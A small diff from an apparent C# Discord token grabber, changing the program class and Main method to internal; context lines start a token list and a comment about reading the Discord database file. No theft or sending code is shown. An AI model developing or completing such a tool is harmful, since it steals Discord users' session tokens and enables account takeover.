@@ -3,8 +3,8 @@ using System.Collections.Generic;
 using System.IO;
 
 namespace discord_token_grabber {
-    class Program {
-        static void Main(string[] args) {
+    internal class Program {
+        internal static void Main(string[] args) {
             var tokens = new List<string>();
             
             // read the discord db file
